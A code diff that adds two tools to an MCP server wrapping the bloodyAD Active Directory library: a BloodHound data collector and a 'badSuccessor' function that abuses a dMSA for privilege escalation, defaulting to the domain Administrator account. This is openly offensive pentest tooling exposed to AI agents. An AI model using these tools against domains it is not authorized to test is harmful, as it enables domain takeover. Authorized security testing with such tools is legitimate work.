@@ -170,6 +170,23 @@ async def bloodyad_get_trusts(host: str = "", domain: str = "", user: str = "", 
     return run_safely(get.trusts, conn, transitive=_parse_bool(transitive))
 
 @mcp.tool()
+async def bloodyad_get_bloodhound(host: str = "", domain: str = "", user: str = "", password: str = "", follow_trusts: str = "", path: str = "") -> str:
+    """BloodHound CE collector via bloodyAD."""
+    if not all([host, domain, user, password]):
+        return "Error: host, domain, user, and password are required."
+    conn = get_connection(host, domain, user, password, [], "", "", "")
+    return run_safely(get.bloodhound, conn, follow_trusts=_parse_bool(follow_trusts), path=path if path else "CurrentPath")
+
+@mcp.tool()
+async def bloodyad_add_badSuccessor(host: str = "", domain: str = "", user: str = "", password: str = "", dmsa: str = "", target: list[str] = []) -> str:
+    """Adds a bad successor to the dMSA."""
+    if not all([host, domain, user, password, dmsa]):
+        return "Error: host, domain, user, password, and dmsa are required."
+    conn = get_connection(host, domain, user, password, [], "", "", "")
+    return run_safely(add.badSuccessor, conn, dmsa=dmsa, t=target if target else ["CN=Administrator,CN=Users,DC=CurrentDomain"])
+
+
+@mcp.tool()
 async def bloodyad_set_object(host: str = "", domain: str = "", user: str = "", password: str = "", target: str = "", attribute: str = "", value: list[str] = [], raw: str = "", b64: str = "") -> str:
     """Add/Replace/Delete target's attribute via bloodyAD."""
     if not all([host, domain, user, password, target, attribute]):
